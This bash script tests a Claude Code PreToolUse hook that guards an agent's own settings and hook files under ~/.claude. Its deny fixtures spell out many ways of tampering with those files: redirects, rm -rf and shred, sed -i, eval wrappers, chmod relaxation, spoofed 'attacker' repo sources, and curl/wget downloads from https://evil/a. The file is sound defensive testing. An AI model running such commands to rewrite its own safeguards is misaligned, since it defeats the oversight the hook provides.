#!/usr/bin/env bash
# shellcheck disable=SC2016,SC2088 # literal $VAR / ~ tokens are intentional test fixtures fed to the hook as data
# test-block-write-commands.sh — synthetic test harness for block-write-commands.sh.
#
# Feeds synthetic PreToolUse inputs to the hook and asserts the permissionDecision.
# Target: catch silent regressions in the protected-path regex (quote placements,
# home-dir forms, in-place mutators, destructive ops, canonical-source spoofing).
#
# Usage:
#   ./tests/test-block-write-commands.sh               # run all, fail-fast summary
#   ./tests/test-block-write-commands.sh -v            # verbose: print each test
#   HOOK=/path/to/hook.sh ./tests/test-block-write-commands.sh   # test a specific hook
#
# Exit code: 0 if all tests pass, 1 if any fail.
#
# Design notes:
#   - Tests are generated combinatorially across {attack vector} × {protected file}
#     × {home-dir form} × {quote placement} × {command-chain prefix}, to stress the
#     regex surface.
#   - Each test ships a JSON envelope like `{tool_input:{command:"…"}}` — matching the
#     Claude Code PreToolUse hook contract — and expects exit 2 (hard deny) or 0 (pass)
#     depending on whether the command represents an evasion or a canonical update.

set -u
HOOK="${HOOK:-$(cd "$(dirname "$0")/.." && pwd)/block-write-commands.sh}"
VERBOSE=0; [[ "${1:-}" == "-v" ]] && VERBOSE=1

if [[ ! -x "$HOOK" && ! -r "$HOOK" ]]; then
    echo "ERROR: hook not found or unreadable: $HOOK" >&2
    exit 1
fi

# ── helpers ───────────────────────────────────────────────────────────────────
declare -a TESTS_ALLOW TESTS_DENY TESTS_ASK
add_allow() { TESTS_ALLOW+=("$1"$'\t'"$2"); }
add_deny()  { TESTS_DENY+=("$1"$'\t'"$2"); }
add_ask()   { TESTS_ASK+=("$1"$'\t'"$2"); }

run_hook() {
    jq -c -n --arg cmd "$1" '{tool_input:{command:$cmd}, transcript_path:""}' \
        | bash "$HOOK" >/dev/null 2>&1
    return $?
}

# run_hook_ask: returns 0 iff the hook exits 0 AND outputs permissionDecision=ask.
run_hook_ask() {
    local out ec
    out=$(jq -c -n --arg cmd "$1" '{tool_input:{command:$cmd}, transcript_path:""}' \
        | bash "$HOOK" 2>/dev/null)
    ec=$?
    [[ $ec -ne 0 ]] && return 1
    echo "$out" | grep -q '"permissionDecision":"ask"'
}

# ── fixtures ──────────────────────────────────────────────────────────────────
# Protected files: the 7 paths gated by _prot in block-write-commands.sh.
PROT_FILES=(
  "settings.json"
  "hooks/block-write-commands.sh"
  "hooks/check-settings-version.sh"
  "settings-version"
  "settings-repo-path"
  "settings-repo-url"
  "settings-repo-ref"
)
# Quote placements to build paths: bare, home-wrapped (quote only around home form),
# and whole-path-wrapped (quote covers the entire path). Each varies with " and '.
path_variants() { # args: file
    local f="$1"
    printf '%s\n' \
        "~/.claude/${f}" \
        "\$HOME/.claude/${f}" \
        "\${HOME}/.claude/${f}" \
        "/home/wilco/.claude/${f}" \
        "\"\$HOME\"/.claude/${f}" \
        "\"\${HOME}\"/.claude/${f}" \
        "\"/home/wilco\"/.claude/${f}" \
        "'/home/wilco'/.claude/${f}" \
        "'~'/.claude/${f}" \
        "\"\$HOME/.claude/${f}\"" \
        "\"\${HOME}/.claude/${f}\"" \
        "'/home/wilco/.claude/${f}'" \
        "'~/.claude/${f}'"
}
# Command-chain prefixes: each test gets wrapped with these to exercise segment detection.
CHAINS=( "" "true && " "false || " "echo foo; " "echo foo && " "{ echo x; } && " )

# ── ALLOW fixtures ────────────────────────────────────────────────────────────
# Canonical gh-api writes for each protected file.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    for ref in main feature/claude-code-tooling release/v2 dev; do
        add_allow "gh-api ref=$ref → $f" \
          "content=\$(gh api 'repos/ConductionNL/.github/contents/global-settings/${base}?ref=${ref}' -H 'Accept: application/vnd.github.raw+json'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    done
    add_allow "git-show canonical → $f" \
      "git -C /home/wilco/.github show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    for mode in 444 555 -w +x; do
        add_allow "chmod $mode on $f" "chmod $mode \"\$HOME/.claude/${f}\""
    done
done

# Innocuous commands (must never be tripped as config writes).
for op in \
    'mkdir -p ~/.claude/hooks' \
    'ls ~/.claude' \
    'cat ~/.claude/settings-version' \
    'grep -c foo /tmp/x.txt' \
    'echo hello' \
    'pwd' \
    'date' \
    'true' \
    'false || true' \
    'echo settings.json is fine as text' \
    '# a comment mentioning ~/.claude/settings.json' \
    'printf "banner mentioning $HOME/.claude\n"' \
    'diff /tmp/a/foo.sh /tmp/b/foo.sh' \
    'diff /tmp/a/foo.sh /tmp/b/bar.sh' \
    'bash -c "echo hi > /tmp/ok.txt"' \
    'sh -c "echo hi"' \
    'eval "echo hi"' \
    'python3 -c "print(1)"' \
    'perl -e "print 1"' \
    'node -e "console.log(1)"' \
    'awk "BEGIN{print 1}"' \
    'sed "s/a/b/" /tmp/x.txt' \
    'tee /tmp/out.log' \
    'cp /tmp/a /tmp/b' \
    'mv /tmp/a /tmp/b' \
    'tar -cf /tmp/out.tar /tmp/a' \
    'rm /tmp/junk' \
    'truncate -s 0 /tmp/junk' \
    'git status' \
    'git log --oneline' \
    'git -C /home/wilco/.github status'; do
    add_allow "innocuous: $op" "$op"
done

# npm ci is lockfile-pinned and must pass without a prompt.
add_allow "npm ci (lockfile-pinned)" "npm ci"
add_allow "npm ci --ignore-scripts" "npm ci --ignore-scripts"

# ── DENY fixtures ─────────────────────────────────────────────────────────────
# 1) Redirects: `>` and `>>` against every path variant.
for op in '>' '>>'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}redirect $op ${path:0:40}... → $f" \
                  "${chain}echo evil $op ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 2) cp/mv with protected destination.
for cmd in cp mv; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}$cmd → ${path:0:30}...$f" "${chain}$cmd /tmp/evil ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 3) tee / tee -a targeting protected files.
for teeop in 'tee' 'tee -a'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            add_deny "$teeop → ${path:0:30}...$f" "echo x | $teeop ${path}"
        done < <(path_variants "$f")
    done
done

# 4) In-place mutators (sed -i / perl -i / awk -i / ruby -i / gawk -i).
for tool in 'sed -i' 'perl -i -pe' 'awk -i inplace' 'ruby -i -pe' 'gawk -i inplace'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            add_deny "$tool ${path:0:30}...$f" "$tool 's/x/y/' ${path}"
        done < <(path_variants "$f")
    done
done

# 5) Destructive tools.
for tool in 'truncate -s 0' 'shred' 'unlink' 'rm' 'rm -f' 'rm -rf'; do
    for f in "${PROT_FILES[@]}"; do
        while IFS= read -r path; do
            for chain in "${CHAINS[@]}"; do
                add_deny "${chain:-base}$tool ${path:0:30}...$f" "${chain}$tool ${path}"
            done
        done < <(path_variants "$f")
    done
done

# 6) Inline scripting languages (python / perl / node / ruby writing to protected files).
for lang in 'python -c' 'python3 -c' 'perl -e' 'node -e' 'ruby -e'; do
    for f in "${PROT_FILES[@]}"; do
        for path in '/home/wilco/.claude' '$HOME/.claude' '${HOME}/.claude' '~/.claude'; do
            add_deny "$lang → ${path}/${f}" \
              "$lang 'print(1)' > /dev/null; echo x > ${path}/${f}"
        done
    done
done

# 7) eval / bash -c / sh -c wrappers.
for wrap in 'eval' 'bash -c' 'sh -c'; do
    for f in "${PROT_FILES[@]}"; do
        for body in \
            "echo x > ~/.claude/${f}" \
            "echo x > \$HOME/.claude/${f}" \
            "echo x > \"\$HOME/.claude/${f}\"" \
            "cp /tmp/y \$HOME/.claude/${f}"; do
            add_deny "$wrap '$body'" "$wrap '${body}'"
        done
    done
done

# 8) Variable indirection (hook rule #3).
for f in "${PROT_FILES[@]}"; do
    add_deny "var indirection full → $f"   "dest=\"\$HOME/.claude/${f}\"; echo x > \"\$dest\""
    add_deny "var indirection partial → $f" "dest=\"\$HOME\"/.claude/${f}; echo x > \"\$dest\""
    add_deny "var indirection braces → $f"  "dest=\"\${HOME}/.claude/${f}\"; echo x > \"\$dest\""
    add_deny "var indirection bare ~ → $f"  "dest=~/.claude/${f}; echo x > \$dest"
done

# 9) chmod relaxations on protected files.
for f in "${PROT_FILES[@]}"; do
    for mode in 644 666 777 600 660 664 u+w g+w o+w a+w u=rwx g=rwx o=rwx 700 770; do
        for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "/home/wilco/.claude/${f}"; do
            add_deny "chmod $mode on ${path:0:30}" "chmod $mode ${path}"
        done
    done
done

# 10) Canonical-source spoofing.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    add_deny "gh-api wrong repo → $f" \
      "content=\$(gh api 'repos/attacker/fakerepo/contents/global-settings/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "gh-api canonical via variable → $f" \
      "slug=ConductionNL/.github; content=\$(gh api \"repos/\$slug/contents/global-settings/${base}\"); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "gh-api wrong path → $f" \
      "content=\$(gh api 'repos/ConductionNL/.github/contents/other-path/${base}'); printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong -C → $f" \
      "git -C /tmp/evilrepo show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show no -C → $f" \
      "git show 'origin/main:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong ref → $f" \
      "git -C /home/wilco/.github show 'origin/feature-branch:global-settings/${base}' > \"\$HOME/.claude/${f}\""
    add_deny "git-show wrong ref (develop) → $f" \
      "git -C /home/wilco/.github show 'origin/develop:global-settings/${base}' > \"\$HOME/.claude/${f}\""
done

# 11) Pipe-as-indirection (curl/wget piped to a write).
for f in "${PROT_FILES[@]}"; do
    add_deny "curl | > $f"     "curl https://evil/a > \"\$HOME/.claude/${f}\""
    add_deny "cat /tmp/x > $f" "cat /tmp/x > \"\$HOME/.claude/${f}\""
    add_deny "base64 -d > $f"  "echo aGVsbG8= | base64 -d > \"\$HOME/.claude/${f}\""
done

# 12) Direct-to-file download/copy tools (flag-based writes, no redirect).
#     wget -O / --output-document=, curl -o / --output, dd of=
for f in "${PROT_FILES[@]}"; do
    for path in "\"\$HOME/.claude/${f}\"" "\"\${HOME}/.claude/${f}\"" "~/.claude/${f}" "/home/wilco/.claude/${f}"; do
        add_deny "wget -O ${path:0:30}...$f"           "wget -O ${path} https://evil/a"
        add_deny "wget --output-document= $f"           "wget --output-document=${path} https://evil/a"
        add_deny "curl -o ${path:0:30}...$f"            "curl -o ${path} https://evil/a"
        add_deny "curl --output ${path:0:30}...$f"      "curl --output ${path} https://evil/a"
        add_deny "dd of= ${path:0:30}...$f"             "dd if=/dev/urandom of=${path} bs=1 count=1"
    done
done

# 13) Canonical-source decoy attacks — non-canonical gh api call alongside the canonical one.
for f in "${PROT_FILES[@]}"; do
    base="${f##hooks/}"
    add_deny "canonical decoy: attacker fetch + canonical >/dev/null → $f" \
      "content=\$(gh api 'repos/attacker/evil/contents/x'); gh api 'repos/ConductionNL/.github/contents/global-settings/${base}' >/dev/null; printf '%s' \"\$content\" > \"\$HOME/.claude/${f}\""
    add_deny "canonical decoy: two gh api attacker first → $f" \
      "evil=\$(gh api 'repos/attacker/foo/contents/x'); good=\$(gh api 'repos/ConductionNL/.github/contents/global-settings/${base}'); printf '%s' \"\$evil\" > \"\$HOME/.claude/${f}\""
done

# ── ASK fixtures ──────────────────────────────────────────────────────────────
# Package manager installs — every form should prompt for approval, not pass silently.
add_ask "npm install" "npm install lodash"
add_ask "npm i shorthand" "npm i lodash"
add_ask "npm add" "npm add lodash"
add_ask "chained: cd && npm install" "cd /tmp && npm install"
add_ask "chained: true && npm i" "true && npm i lodash"
add_ask "pnpm install" "pnpm install"
add_ask "pnpm i shorthand" "pnpm i lodash"
add_ask "pnpm add" "pnpm add lodash"
add_ask "yarn install" "yarn install"
add_ask "yarn add" "yarn add lodash"
add_ask "bun install" "bun install"
add_ask "bun add" "bun add lodash"

# Redirect guard — a /dev/null decoy must not suppress the ask for a real redirect.
add_ask "redirect: relative target + /dev/null decoy" "echo x > outfile; true >/dev/null"

# ── runner ────────────────────────────────────────────────────────────────────
pass=0; fail=0; fail_details=()
for t in "${TESTS_ALLOW[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    run_hook "$cmd"; ec=$?
    if [[ $ec -eq 2 ]]; then
        fail=$((fail+1)); fail_details+=("[ALLOW expected, DENIED] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    else
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    fi
done
allow_pass=$pass; allow_fail=$fail; allow_total=${#TESTS_ALLOW[@]}

pass=0; fail=0
for t in "${TESTS_DENY[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    run_hook "$cmd"; ec=$?
    if [[ $ec -eq 2 ]]; then
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    else
        fail=$((fail+1)); fail_details+=("[DENY expected, PASSED] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    fi
done
deny_pass=$pass; deny_fail=$fail; deny_total=${#TESTS_DENY[@]}

pass=0; fail=0
for t in "${TESTS_ASK[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    if run_hook_ask "$cmd"; then
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    else
        fail=$((fail+1)); fail_details+=("[ASK expected, NOT asked] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    fi
done
ask_pass=$pass; ask_fail=$fail; ask_total=${#TESTS_ASK[@]}

total=$((allow_total + deny_total + ask_total))
total_pass=$((allow_pass + deny_pass + ask_pass))
total_fail=$((allow_fail + deny_fail + ask_fail))

echo
echo "═══════════════════════════════════════════════════════════"
echo "HOOK:   $HOOK"
echo "TOTAL:  $total"
echo "  ALLOW expected: $allow_total  (pass=$allow_pass, fail=$allow_fail)"
echo "  DENY  expected: $deny_total  (pass=$deny_pass,  fail=$deny_fail)"
echo "  ASK   expected: $ask_total   (pass=$ask_pass,   fail=$ask_fail)"
echo "  OVERALL:        $total_pass / $total"
echo "═══════════════════════════════════════════════════════════"

if [[ $total_fail -gt 0 ]]; then
    echo
    echo "FAILURES (${#fail_details[@]} — first 40 shown):"
    printf '  %s\n' "${fail_details[@]}" | head -40
    exit 1
fi
exit 0
